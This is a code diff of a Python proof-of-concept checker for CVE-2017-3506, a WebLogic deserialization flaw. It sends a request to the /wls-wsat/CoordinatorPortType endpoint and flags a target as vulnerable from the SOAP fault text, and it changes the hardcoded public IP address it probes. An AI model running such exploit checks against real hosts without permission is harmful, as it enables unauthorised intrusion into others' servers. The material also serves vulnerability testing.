@@ -14,7 +14,7 @@ heads = {
 
 
 def check(url):
-    if not url.startswith("http"):
+    if '://' not in str(url):
         url = "http://" + url
     if "/" in url:
         url += '/wls-wsat/CoordinatorPortType'
@@ -45,22 +45,25 @@ def check(url):
     '''
 
     try:
-        response = requests.post(url, data=post_str, verify=False, timeout=5, headers=heads)
+        response = requests.post(url, data=post_str, verify=False, timeout=10, headers=heads)
         response = response.text
-        response = re.search("\<faultstring\>.*\<\/faultstring\>", response).group(0)
+        response = re.search(u"<faultstring>.*</faultstring>", response).group(0)
     except:
         response = ""
 
     if '<faultstring>java.lang.ProcessBuilder' in response or "<faultstring>0" in response:
-        result = '目标weblogic存在JAVA反序列化漏洞：CVE-2017-3506 : %s' % url
+        result = '目标Weblogic存在JAVA反序列化漏洞,CVE-2017-3506 : %s' % url
         return result
-
+    # else:
+    #     return 'CVE-2017-3506'
 
 def poc(ip):
-    result = check(ip)
-    return result
-
+    try:
+        result = check(ip)
+        return result
+    except:
+        pass
 
 if __name__ == '__main__':
-    a = poc('167.86.78.228:7001')
+    a = poc('181.198.62.181:7001')
     print(a)
